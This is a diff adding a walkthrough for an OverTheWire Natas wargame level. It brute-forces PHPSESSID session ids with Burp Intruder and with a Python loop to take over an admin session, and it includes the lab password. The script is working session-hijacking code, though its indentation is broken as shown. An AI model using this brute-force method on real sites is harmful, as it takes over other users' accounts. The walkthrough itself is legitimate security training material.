@@ -894,3 +894,106 @@ Step 10: Finally it will get the password for level-18
 +  Password : 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 + Domain : http://natas18.natas.labs.overthewire.org
 ## Explination
+Step 1:  Go to Firefox Browser, Then Connect to natas18.natas.labs.overthewire.org, Then login with username and password
+
+Step 2: You will see the page like this
+
+![image](./images-1/image-18.png)
+
+Step 3: Lets view the source code
+
+![image](./images-1/image-18-1.png)
+
+![image](./images-1/image-18-2.png)
+
+Step 4: Max id declared has 640 we can use brutefore upto 1 to 640
+
+Step 5: We need to use Bruteforce attack to get the password for level-18, In Burpsute,  brut force attack can be  done using the intruder function
+
+ Step 6: Go to Burpsuite Then click intercept on (Recieve)
+
+ Step 7: Go to Firefox Browser, Then enter the username and password and click on login. Before that set up burpsuite in firefox browser (Send)
+
+ ![image](./images-1/image-18-3.png)
+
+Step 8: Then Burpsuite can catch that, We want to Bruteforce PHPSESSID:285
+
+![image](./images-1/image-18-4.png)
+
+Step 9: Then send to intruder, for that right click on request, Then click on send intruder. Then intruder get highlighted, Then click intruder , which is at meanus bar
+
+![image](./images-1/image-18-5.png)
+
+Step 10: In that intruder, we will change that PHPSESSID:285
+
+![image](./images-1/image-18-6.png)
+
+Step 11: Then click on payloads, change that inputs in payloads
+
+![image](./images-1/image-18-7.png)
+
+Step 12: Then go to settings tab ,in that settings tab then go to grep - extract, choose add option, fetch response , then drag that looged to natas19
+
+![image](./images-1/image-18-8.png)
+
+Step 13: Then click on start attack
+
+![image](./images-1/image-18-9.png)
+
+Step 14: It will fetch one by one , in that you will get admin login PHPSESSID , Then go to intercept tab, Then change that PHPSESSID: what you get from the attack, Then click on forward, you will get the password for level-19
+
+![image](./images-1/image-18-10.png)
+
+
+### Method 2
+Step 1: After saw the max id is 640, Then we will use Bruteforce attack 
+
+Step 2: Write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+    import requests
+
+    base_url = 'http://natas18.natas.labs.overthewire.org'
+    auth_username = 'natas18'
+    auth_password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'
+
+    for i in range(640):
+                 headers = {
+                 "Cookie": "PHPSESSID={0}".format(i)
+                   }
+
+                  payload = {
+                "username": "any",
+                 "password": "any"
+                 }
+
+                 r = requests.post(
+                 base_url,
+                 auth=(auth_username, auth_password),
+                 headers=headers,
+                 data=payload
+                )
+
+                if "You are logged in as a regular user" in r.text:
+                print("PHPSESSID={0} : Failed".format(i))
+                else:
+                print("PHPSESSID={0} : Success".format(i))
+                print(r.text)
+                break
+
+    print("Test completed")
+
+Step 3: It will fetch one by one like loop, By using of Bruteforce attack, Then you will wait until it will get the PHPSESSID
+
+![image](./images-1/image-18-11.png)
+
+![image](./images-1/image-18-12.png)
+
+Step 4: Then go to intercept tab, Then change that PHPSESSID: what you get from the attack, Then click on forward, 
+
+![image](./images-1/image-18-13.png)
+
+Step 5: Then you will get the password for Natas19
+
+![image](./images-1/image-18-14.png)
+
+
